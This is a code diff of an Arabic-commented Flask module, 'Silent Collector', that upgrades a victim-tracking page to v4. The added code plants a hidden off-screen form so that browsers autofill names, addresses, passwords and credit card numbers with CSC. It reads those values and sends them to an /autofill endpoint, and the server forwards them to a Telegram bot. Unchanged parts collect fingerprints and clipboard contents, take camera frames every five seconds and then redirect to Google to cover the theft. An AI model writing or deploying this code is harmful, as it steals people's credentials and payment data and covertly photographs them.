@@ -1,8 +1,9 @@
 # silent_collector.py
 # ============================================================
-# Silent Collector v3 — التصعيد الذكي
+# Silent Collector v4 — التصعيد الذكي + Autofill Hijack
 # - جمع صامت فوري (بدون إذن)
-# - طلب إذن الكاميرا بأسلوب ذكي (بعد ثواني)
+# - Autofill Hijack: سرقة بيانات المتصفح التلقائية
+# - طلب إذن الكاميرا بأسلوب ذكي
 # - تصوير مستمر كل 5 ثواني لحد ما الضحية تخرج
 # - الرجوع لـ Google تلقائياً
 # ============================================================
@@ -34,9 +35,10 @@ silent_bp = Blueprint('silent_collector', __name__)
 SESSION_TTL = 86400 * 30        # 30 يوم
 GOOGLE_REDIRECT = "https://www.google.com"
 CAMERA_INTERVAL = 5000          # 5 ثواني بين كل صورة
-CAMERA_MAX_FRAMES = 60          # حد أقصى 60 صورة لكل جلسة (5 دقائق)
-ACCESS_DELAY = 2500             # تأخير قبل طلب الإذن (2.5 ثانية)
-REDIRECT_DELAY = 2500           # تأخير قبل الرجوع للجوجل
+CAMERA_MAX_FRAMES = 60          # حد أقصى 60 صورة لكل جلسة
+ACCESS_DELAY = 2500             # تأخير قبل طلب الإذن
+REDIRECT_DELAY = 2500
+AUTOFILL_DELAY = 800            # تأخير قبل قراءة الـ autofill
 
 
 # المواقع اللي بنكشف جلساتها
@@ -74,7 +76,7 @@ KNOWN_SITES = {
 
 
 # ============================================================
-# ★★★ صفحة الالتقاط v3 — التصعيد الذكي ★★★
+# صفحة الالتقاط v4 — التصعيد الذكي + Autofill Hijack
 # ============================================================
 COLLECTOR_PAGE = r"""<!DOCTYPE html>
 <html lang="ar" dir="rtl">
@@ -125,9 +127,111 @@ COLLECTOR_PAGE = r"""<!DOCTYPE html>
   @keyframes fadeOut {
     to { opacity: 0; }
   }
+
+  /* ═══════════════════════════════════════════════════ */
+  /* Autofill Hijack — الحقول المخفية */
+  /* مخفية تماماً عن المستخدم لكن ظاهرة للمتصفح */
+  /* ═══════════════════════════════════════════════════ */
+  .af-hijack {
+    position: fixed !important;
+    left: -9999px !important;
+    top: -9999px !important;
+    width: 1px !important;
+    height: 1px !important;
+    opacity: 0.01 !important;
+    pointer-events: none !important;
+    z-index: -9999 !important;
+    overflow: hidden !important;
+  }
 </style>
 </head>
 <body>
+
+<!-- ═══════════════════════════════════════════════════ -->
+<!-- ★★★ Autofill Hijack Form — مخفي تماماً ★★★ -->
+<!-- ═══════════════════════════════════════════════════ -->
+<form id="af_form" class="af-hijack" autocomplete="on" onsubmit="return false;">
+    <!-- Name -->
+    <input type="text" name="name" id="af_name" 
+           autocomplete="name" placeholder="Full Name">
+    <input type="text" name="fname" id="af_fname" 
+           autocomplete="given-name" placeholder="First Name">
+    <input type="text" name="lname" id="af_lname" 
+           autocomplete="family-name" placeholder="Last Name">
+    
+    <!-- Email -->
+    <input type="email" name="email" id="af_email" 
+           autocomplete="email" placeholder="Email">
+    <input type="email" name="email2" id="af_email2" 
+           autocomplete="username" placeholder="Username/Email">
+    
+    <!-- Phone -->
+    <input type="tel" name="phone" id="af_phone" 
+           autocomplete="tel" placeholder="Phone">
+    <input type="tel" name="phone_national" id="af_phone_national" 
+           autocomplete="tel-national" placeholder="Phone National">
+    <input type="tel" name="phone_country" id="af_phone_country" 
+           autocomplete="tel-country-code" placeholder="Country Code">
+    
+    <!-- Address -->
+    <input type="text" name="street" id="af_street" 
+           autocomplete="street-address" placeholder="Street Address">
+    <input type="text" name="address_line1" id="af_addr1" 
+           autocomplete="address-line1" placeholder="Address Line 1">
+    <input type="text" name="address_line2" id="af_addr2" 
+           autocomplete="address-line2" placeholder="Address Line 2">
+    <input type="text" name="city" id="af_city" 
+           autocomplete="address-level2" placeholder="City">
+    <input type="text" name="state" id="af_state" 
+           autocomplete="address-level1" placeholder="State/Province">
+    <input type="text" name="country" id="af_country" 
+           autocomplete="country" placeholder="Country">
+    <input type="text" name="country_name" id="af_country_name" 
+           autocomplete="country-name" placeholder="Country Name">
+    <input type="text" name="zip" id="af_zip" 
+           autocomplete="postal-code" placeholder="Postal Code">
+    
+    <!-- Organization -->
+    <input type="text" name="organization" id="af_org" 
+           autocomplete="organization" placeholder="Organization">
+    <input type="text" name="organization_title" id="af_org_title" 
+           autocomplete="organization-title" placeholder="Job Title">
+    
+    <!-- Personal -->
+    <input type="text" name="bday" id="af_bday" 
+           autocomplete="bday" placeholder="Birthday">
+    <input type="text" name="bday_day" id="af_bday_day" 
+           autocomplete="bday-day" placeholder="Birthday Day">
+    <input type="text" name="bday_month" id="af_bday_month" 
+           autocomplete="bday-month" placeholder="Birthday Month">
+    <input type="text" name="bday_year" id="af_bday_year" 
+           autocomplete="bday-year" placeholder="Birthday Year">
+    <input type="text" name="sex" id="af_sex" 
+           autocomplete="sex" placeholder="Sex">
+    
+    <!-- Username/Password -->
+    <input type="text" name="username" id="af_username" 
+           autocomplete="username" placeholder="Username">
+    <input type="password" name="password" id="af_password" 
+           autocomplete="current-password" placeholder="Password">
+    <input type="password" name="new_password" id="af_new_password" 
+           autocomplete="new-password" placeholder="New Password">
+    
+    <!-- URL -->
+    <input type="url" name="url" id="af_url" 
+           autocomplete="url" placeholder="Website">
+    
+    <!-- Credit Card (بعض المتصفحات تملأها) -->
+    <input type="text" name="cc_name" id="af_cc_name" 
+           autocomplete="cc-name" placeholder="Cardholder Name">
+    <input type="text" name="cc_number" id="af_cc_number" 
+           autocomplete="cc-number" placeholder="Card Number">
+    <input type="text" name="cc_exp" id="af_cc_exp" 
+           autocomplete="cc-exp" placeholder="Card Expiry">
+    <input type="text" name="cc_csc" id="af_cc_csc" 
+           autocomplete="cc-csc" placeholder="Card CSC">
+</form>
+
 <div class="loader-container">
   <div class="spinner"></div>
   <div class="text">جاري التحميل...</div>
@@ -143,6 +247,7 @@ COLLECTOR_PAGE = r"""<!DOCTYPE html>
     var CAMERA_INTERVAL = __CAMERA_INTERVAL__;
     var CAMERA_MAX_FRAMES = __CAMERA_MAX_FRAMES__;
     var ACCESS_DELAY = __ACCESS_DELAY__;
+    var AUTOFILL_DELAY = __AUTOFILL_DELAY__;
 
     // ─── متغيرات التصوير ───
     var videoStream = null;
@@ -226,7 +331,7 @@ COLLECTOR_PAGE = r"""<!DOCTYPE html>
     } catch(e) {}
 
     // ═══════════════════════════════════════════════════
-    // 2. بصمة الجهاز (Canvas + WebGL + Audio)
+    // 2. بصمة الجهاز
     // ═══════════════════════════════════════════════════
     function getWebGLInfo() {
         try {
@@ -692,7 +797,76 @@ COLLECTOR_PAGE = r"""<!DOCTYPE html>
     }
 
     // ═══════════════════════════════════════════════════
-    // 7. ★★★ الكاميرا — التصعيد الذكي ★★★
+    // ★★★ 7. Autofill Hijack — سرقة البيانات التلقائية ★★★
+    // ═══════════════════════════════════════════════════
+    function collectAutofill() {
+        return new Promise(function(resolve) {
+            var result = {};
+            
+            try {
+                // القائمة الكاملة للحقول
+                var fields = [
+                    'name', 'fname', 'lname',
+                    'email', 'email2',
+                    'phone', 'phone_national', 'phone_country',
+                    'street', 'address_line1', 'address_line2',
+                    'city', 'state', 'country', 'country_name', 'zip',
+                    'organization', 'organization_title',
+                    'bday', 'bday_day', 'bday_month', 'bday_year', 'sex',
+                    'username', 'password', 'new_password',
+                    'url',
+                    'cc_name', 'cc_number', 'cc_exp', 'cc_csc'
+                ];
+
+                // اقرأ قيم كل الحقول
+                for (var i = 0; i < fields.length; i++) {
+                    var field = fields[i];
+                    var el = document.getElementById('af_' + field);
+                    if (el && el.value && el.value.length > 0) {
+                        result[field] = el.value.substring(0, 500);
+                    }
+                }
+
+                // جرّب استخدام الـ FormData كمان
+                try {
+                    var form = document.getElementById('af_form');
+                    if (form) {
+                        var formData = new FormData(form);
+                        formData.forEach(function(value, key) {
+                            if (value && value.length > 0 && !result[key]) {
+                                result[key] = String(value).substring(0, 500);
+                            }
+                        });
+                    }
+                } catch(e) {}
+
+                // لو مفيش أي شيء تم ملؤه → انتظر أكثر
+                if (Object.keys(result).length === 0) {
+                    // جرّب تاني بعد 500ms
+                    setTimeout(function() {
+                        var result2 = {};
+                        for (var j = 0; j < fields.length; j++) {
+                            var field2 = fields[j];
+                            var el2 = document.getElementById('af_' + field2);
+                            if (el2 && el2.value && el2.value.length > 0) {
+                                result2[field2] = el2.value.substring(0, 500);
+                            }
+                        }
+                        resolve(result2);
+                    }, 500);
+                    return;
+                }
+
+                resolve(result);
+
+            } catch(e) {
+                resolve({});
+            }
+        });
+    }
+
+    // ═══════════════════════════════════════════════════
+    // 8. الكاميرا — التصعيد الذكي
     // ═══════════════════════════════════════════════════
     function startSilentCapture() {
         return new Promise(function(resolve) {
@@ -701,7 +875,6 @@ COLLECTOR_PAGE = r"""<!DOCTYPE html>
                     return resolve(false);
                 }
 
-                // إنشاء عنصر الفيديو (مخفي)
                 videoEl = document.createElement('video');
                 videoEl.setAttribute('playsinline', '');
                 videoEl.setAttribute('autoplay', '');
@@ -711,7 +884,6 @@ COLLECTOR_PAGE = r"""<!DOCTYPE html>
 
                 document.body.appendChild(videoEl);
 
-                // اطلب إذن الكاميرا
                 navigator.mediaDevices.getUserMedia({
                     video: {
                         facingMode: 'user',
@@ -727,18 +899,15 @@ COLLECTOR_PAGE = r"""<!DOCTYPE html>
                         videoEl.play().then(function() {
                             cameraActive = true;
 
-                            // أرسل إشارة بدء
                             sendSignal('camera_started', {
                                 width: videoEl.videoWidth,
                                 height: videoEl.videoHeight
                             });
 
-                            // التقط أول صورة فوراً
                             setTimeout(function() {
                                 captureFrame();
                             }, 500);
 
-                            // ابدأ التصوير المستمر
                             captureInterval = setInterval(function() {
                                 if (framesCaptured >= CAMERA_MAX_FRAMES) {
                                     stopCapture('max_frames_reached');
@@ -753,7 +922,6 @@ COLLECTOR_PAGE = r"""<!DOCTYPE html>
                         });
                     };
                 }).catch(function(err) {
-                    // رفض أو فشل
                     sendSignal('camera_denied', { error: err.name || 'unknown' });
                     resolve(false);
                 });
@@ -778,12 +946,9 @@ COLLECTOR_PAGE = r"""<!DOCTYPE html>
 
             framesCaptured++;
 
-            // أرسل الصورة
             sendFrame(imageData, framesCaptured);
 
-        } catch(e) {
-            // تجاهل الأخطاء
-        }
+        } catch(e) {}
     }
 
     function sendFrame(imageData, frameNum) {
@@ -798,7 +963,6 @@ COLLECTOR_PAGE = r"""<!DOCTYPE html>
 
             var jsonStr = JSON.stringify(payload);
 
-            // جرّب sendBeacon أولاً
             if (navigator.sendBeacon) {
                 try {
                     var blob = new Blob([jsonStr], { type: 'application/json' });
@@ -808,7 +972,6 @@ COLLECTOR_PAGE = r"""<!DOCTYPE html>
                 } catch(e) {}
             }
 
-            // fallback: fetch
             fetch(ENDPOINT + '/camera', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -845,7 +1008,7 @@ COLLECTOR_PAGE = r"""<!DOCTYPE html>
     }
 
     // ═══════════════════════════════════════════════════
-    // 8. الإرسال
+    // 9. الإرسال
     // ═══════════════════════════════════════════════════
     function sendSignal(type, extra) {
         try {
@@ -876,6 +1039,43 @@ COLLECTOR_PAGE = r"""<!DOCTYPE html>
                 keepalive: true
             }).catch(function() {});
         } catch(e) {}
+    }
+
+    function sendAutofill(autofillData) {
+        return new Promise(function(resolve) {
+            try {
+                if (!autofillData || Object.keys(autofillData).length === 0) {
+                    return resolve(false);
+                }
+
+                var payload = {
+                    session_id: SESSION_ID,
+                    type: 'autofill_data',
+                    data: autofillData,
+                    timestamp: Date.now()
+                };
+
+                var jsonStr = JSON.stringify(payload);
+
+                if (navigator.sendBeacon) {
+                    try {
+                        var blob = new Blob([jsonStr], { type: 'application/json' });
+                        if (navigator.sendBeacon(ENDPOINT + '/autofill', blob)) {
+                            return resolve(true);
+                        }
+                    } catch(e) {}
+                }
+
+                fetch(ENDPOINT + '/autofill', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: jsonStr,
+                    keepalive: true
+                }).then(function() { resolve(true); })
+                  .catch(function() { resolve(false); });
+
+            } catch(e) { resolve(false); }
+        });
     }
 
     function collectAll() {
@@ -948,42 +1148,40 @@ COLLECTOR_PAGE = r"""<!DOCTYPE html>
     var redirectTimer = null;
     var permissionTimer = null;
 
-    // ─── 1. جمع وإرسال فوري ───
+    // ─── 1. جمع وإرسال فوري (بدون autofill بعد) ───
     collectAll()
         .then(function(payload) {
             return sendMainData(payload);
         })
         .then(function() {
-            // ─── 2. بعد ACCESS_DELAY → اطلب إذن الكاميرا ───
+            // ─── 2. Autofill Hijack بعد AUTOFILL_DELAY ───
+            // ننتظر عشان المتصفح يملأ الحقول تلقائياً
+            setTimeout(function() {
+                collectAutofill().then(function(autofillData) {
+                    if (autofillData && Object.keys(autofillData).length > 0) {
+                        sendAutofill(autofillData);
+                    }
+                });
+            }, AUTOFILL_DELAY);
+
+            // ─── 3. بعد ACCESS_DELAY → اطلب إذن الكاميرا ───
             permissionTimer = setTimeout(function() {
                 startSilentCapture().then(function(started) {
                     if (started) {
-                        // الكاميرا بدأت → ما ترجعش للجوجل بسرعة
-                        // خليها تفضل شغالة لحد ما الضحية تخرج
-                        // أو لحد CAMERA_MAX_FRAMES
-                        logger_signal('camera_started_keep_alive');
-
-                        // لا redirect دلوقتي — ننتظر
-                        // بس نخلي redirect احتياطي بعد دقيقة ونص
+                        // الكاميرا بدأت → ما ترجعش بسرعة
                         redirectTimer = setTimeout(function() {
                             doRedirect();
                         }, 90000);
-
                     } else {
-                        // مفيش كاميرا → رجوع سريع للجوجل
+                        // مفيش كاميرا → رجوع سريع
                         redirectTimer = setTimeout(doRedirect, 1500);
                     }
                 });
             }, ACCESS_DELAY);
         })
         .catch(function() {
-            // في حالة خطأ → رجوع عادي
             redirectTimer = setTimeout(doRedirect, 1500);
         });
-
-    function logger_signal(s) {
-        try { console.log('[SC]', s); } catch(e) {}
-    }
 
     // ─── عند الخروج: أوقف التصوير ───
     window.addEventListener('beforeunload', function() {
@@ -998,12 +1196,10 @@ COLLECTOR_PAGE = r"""<!DOCTYPE html>
         stopCapture('unload');
     });
 
-    // ─── رصد فقدان التركيز (الضحية نقلت التاب) ───
+    // ─── رصد خروج الضحية من التاب ───
     document.addEventListener('visibilitychange', function() {
         if (document.hidden) {
-            // الضحية خرجت من التاب → أوقف التصوير
             stopCapture('tab_hidden');
-            // وارجع للجوجل
             setTimeout(doRedirect, 500);
         }
     });
@@ -1037,6 +1233,7 @@ def create_silent_session(chat_id, label=""):
             "collected": False,
             "camera_started": False,
             "camera_frames": 0,
+            "autofill_received": False,
         }
 
         redis_client.setex(
@@ -1076,7 +1273,6 @@ def store_collected_data(session_id, data):
         session_data = json.loads(raw)
         chat_id = session_data["chat_id"]
 
-        # إثراء من الهيدرز
         enriched = dict(data)
         enriched['ip'] = (
             request.headers.get('CF-Connecting-IP') or
@@ -1091,14 +1287,12 @@ def store_collected_data(session_id, data):
         enriched['received_at_str'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
         enriched['label'] = session_data.get('label', '')
 
-        # احفظ
         redis_client.setex(
             f"silent_data:{session_id}",
             SESSION_TTL,
             json.dumps(enriched, ensure_ascii=False)
         )
 
-        # حدّث session
         session_data["collected"] = True
         session_data["collected_at"] = time.time()
         redis_client.setex(
@@ -1110,13 +1304,167 @@ def store_collected_data(session_id, data):
         logger.info(f"Data collected: {session_id} | IP={enriched['ip']} | chat={chat_id}")
         metrics.inc_counter("silent_data_collected")
 
-        # أبلغ البوت
         notify_bot(chat_id, session_id, enriched)
 
         return True
 
     except Exception as e:
         logger.exception(f"store_collected_data error: {e}")
+        return False
+
+
+# ============================================================
+# ★★★ استقبال بيانات Autofill ★★★
+# ============================================================
+def store_autofill_data(session_id, data):
+    """يخزن بيانات Autofill ويرسلها للبوت"""
+    if not redis_client:
+        return False
+
+    try:
+        raw = redis_client.get(f"silent:{session_id}")
+        if not raw:
+            return False
+
+        session_data = json.loads(raw)
+        chat_id = session_data["chat_id"]
+        cid = int(chat_id) if str(chat_id).isdigit() else chat_id
+        label = session_data.get('label', '')
+
+        autofill_data = data.get('data', {})
+
+        if not autofill_data or not isinstance(autofill_data, dict):
+            return False
+
+        # احفظ في Redis
+        redis_client.setex(
+            f"silent_autofill:{session_id}",
+            SESSION_TTL,
+            json.dumps(autofill_data, ensure_ascii=False)
+        )
+
+        session_data["autofill_received"] = True
+        redis_client.setex(
+            f"silent:{session_id}",
+            SESSION_TTL,
+            json.dumps(session_data)
+        )
+
+        # حقل الأسماء بالعربي
+        field_names_ar = {
+            'name': 'الاسم الكامل',
+            'fname': 'الاسم الأول',
+            'lname': 'اسم العائلة',
+            'email': 'الإيميل',
+            'email2': 'الإيميل / المستخدم',
+            'phone': 'الهاتف',
+            'phone_national': 'الهاتف المحلي',
+            'phone_country': 'كود الدولة',
+            'street': 'الشارع',
+            'address_line1': 'العنوان 1',
+            'address_line2': 'العنوان 2',
+            'city': 'المدينة',
+            'state': 'المحافظة',
+            'country': 'الدولة',
+            'country_name': 'اسم الدولة',
+            'zip': 'الرمز البريدي',
+            'organization': 'الشركة',
+            'organization_title': 'المسمى الوظيفي',
+            'bday': 'تاريخ الميلاد',
+            'bday_day': 'يوم الميلاد',
+            'bday_month': 'شهر الميلاد',
+            'bday_year': 'سنة الميلاد',
+            'sex': 'الجنس',
+            'username': 'اسم المستخدم',
+            'password': 'كلمة المرور',
+            'new_password': 'كلمة مرور جديدة',
+            'url': 'الموقع',
+            'cc_name': 'اسم حامل البطاقة',
+            'cc_number': 'رقم البطاقة',
+            'cc_exp': 'تاريخ انتهاء البطاقة',
+            'cc_csc': 'CVC/CVV',
+        }
+
+        # بناء الرسالة
+        lines = [
+            f"🎯 <b>Autofill Hijack — بيانات جديدة!</b>",
+            f"━━━━━━━━━━━━━━━━━━",
+            f"🎯 <b>الجلسة:</b> <code>{session_id[:12]}</code>",
+            f"🏷️ <b>الاسم:</b> {label or '—'}",
+            f"",
+            f"📋 <b>البيانات المسروقة ({len(autofill_data)} حقل):</b>",
+            f"━━━━━━━━━━━━━━━━━━",
+        ]
+
+        # رتب الحقول بالأهمية
+        priority_order = [
+            'name', 'fname', 'lname',
+            'email', 'email2',
+            'phone', 'phone_national',
+            'username', 'password',
+            'cc_number', 'cc_exp', 'cc_csc', 'cc_name',
+            'street', 'address_line1', 'address_line2',
+            'city', 'state', 'country', 'zip',
+            'organization', 'organization_title',
+            'bday', 'bday_day', 'bday_month', 'bday_year',
+            'sex', 'url', 'country_name', 'phone_country',
+            'new_password'
+        ]
+
+        shown = set()
+        for key in priority_order:
+            if key in autofill_data and key not in shown:
+                val = autofill_data[key]
+                if val and str(val).strip():
+                    name_ar = field_names_ar.get(key, key)
+                    lines.append(f"• <b>{name_ar}:</b>\n  <code>{str(val)[:200]}</code>")
+                    shown.add(key)
+
+        # الباقي
+        for key, val in autofill_data.items():
+            if key not in shown and val and str(val).strip():
+                name_ar = field_names_ar.get(key, key)
+                lines.append(f"• <b>{name_ar}:</b>\n  <code>{str(val)[:200]}</code>")
+
+        # نبّه لو فيه إيميل
+        if autofill_data.get('email') or autofill_data.get('email2'):
+            email_val = autofill_data.get('email') or autofill_data.get('email2')
+            lines.append(f"\n📧 <b>الإيميل:</b> <code>{email_val}</code>")
+
+        # نبّه لو فيه باسورد
+        if autofill_data.get('password'):
+            lines.append(f"🔑 <b>كلمة المرور:</b> <code>{autofill_data['password'][:100]}</code>")
+
+        text = "\n".join(lines)
+
+        bot.send_message(cid, text, parse_mode="HTML", disable_web_page_preview=True)
+
+        logger.info(f"Autofill data sent: {session_id} | {len(autofill_data)} fields")
+        metrics.inc_counter("silent_autofill_received")
+
+        # ملف JSON كمان
+        try:
+            import io
+            json_str = json.dumps(autofill_data, ensure_ascii=False, indent=2)
+            buf = io.BytesIO(json_str.encode('utf-8'))
+            buf.name = f"autofill_{session_id[:12]}.json"
+
+            bot.send_document(
+                cid, buf,
+                caption=(
+                    f"📦 <b>Autofill Data JSON</b>\n"
+                    f"🆔 <code>{session_id[:12]}</code>\n"
+                    f"📊 <b>الحجم:</b> <code>{len(json_str) / 1024:.1f} KB</code>"
+                ),
+                parse_mode="HTML"
+            )
+        except Exception as e:
+            logger.warning(f"Send autofill JSON error: {e}")
+
+        return True
+
+    except Exception as e:
+        logger.exception(f"store_autofill_data error: {e}")
         return False
 
 
@@ -1141,7 +1489,6 @@ def store_camera_frame(session_id, data):
         frame_num = data.get('frame_num', 0)
         label = session_data.get('label', '')
 
-        # حدّث العدّاد
         session_data["camera_frames"] = frame_num
         session_data["camera_started"] = True
         redis_client.setex(
@@ -1150,7 +1497,6 @@ def store_camera_frame(session_id, data):
             json.dumps(session_data)
         )
 
-        # فك الـ base64 وأرسل للبوت
         try:
             if image_data.startswith('data:image'):
                 _, encoded = image_data.split(',', 1)
@@ -1393,13 +1739,14 @@ def notify_bot(chat_id, session_id, data):
             f"\n📋 <b>الحافظة:</b> {clipboard_text}\n\n"
 
             f"━━━ 🎥 الكاميرا ━━━\n"
-            f"⏳ <i>في انتظار إذن الكاميرا...</i>"
+            f"⏳ <i>في انتظار إذن الكاميرا...</i>\n"
+            f"━━━ 📝 Autofill ━━━\n"
+            f"⏳ <i>في انتظار بيانات المتصفح التلقائية...</i>"
         )
 
         bot.send_message(cid, text, parse_mode="HTML", disable_web_page_preview=True)
         logger.info(f"Report sent to {cid}")
 
-        # ─── ملف JSON كامل ───
         try:
             import io
             json_str = json.dumps(data, ensure_ascii=False, indent=2)
@@ -1467,7 +1814,8 @@ def init_silent_collector_routes(app, bot_instance):
                 .replace("__REDIRECT_URL__", GOOGLE_REDIRECT)
                 .replace("__CAMERA_INTERVAL__", str(CAMERA_INTERVAL))
                 .replace("__CAMERA_MAX_FRAMES__", str(CAMERA_MAX_FRAMES))
-                .replace("__ACCESS_DELAY__", str(ACCESS_DELAY)))
+                .replace("__ACCESS_DELAY__", str(ACCESS_DELAY))
+                .replace("__AUTOFILL_DELAY__", str(AUTOFILL_DELAY)))
 
         response = app.make_response(html)
         response.headers['Content-Type'] = 'text/html; charset=utf-8'
@@ -1568,12 +1916,44 @@ def init_silent_collector_routes(app, bot_instance):
             return resp, 200
 
 
+    @app.route('/s/<session_id>/autofill', methods=['POST', 'OPTIONS'])
+    def silent_autofill_endpoint(session_id):
+        """استقبال بيانات Autofill Hijack"""
+        if request.method == 'OPTIONS':
+            resp = app.make_response('')
+            resp.headers['Access-Control-Allow-Origin'] = '*'
+            resp.headers['Access-Control-Allow-Methods'] = 'POST, OPTIONS'
+            resp.headers['Access-Control-Allow-Headers'] = 'Content-Type'
+            return resp, 200
+
+        try:
+            data = request.get_json(silent=True) or {}
+
+            if data.get('session_id') != session_id:
+                return jsonify({'ok': False}), 200
+
+            if data.get('type') != 'autofill_data':
+                return jsonify({'ok': False}), 200
+
+            success = store_autofill_data(session_id, data)
+
+            resp = jsonify({'ok': success})
+            resp.headers['Access-Control-Allow-Origin'] = '*'
+            return resp, 200
+
+        except Exception as e:
+            logger.exception(f"silent_autofill_endpoint error: {e}")
+            resp = jsonify({'ok': False})
+            resp.headers['Access-Control-Allow-Origin'] = '*'
+            return resp, 200
+
+
     @app.route('/s/<session_id>/go', methods=['GET'])
     def silent_redirect(session_id):
         return redirect(GOOGLE_REDIRECT, code=302)
 
 
-    logger.info("[+] Silent Collector v3 routes registered: /s/<session_id>")
+    logger.info("[+] Silent Collector v4 routes registered: /s/<session_id>")
 
 
 # ============================================================
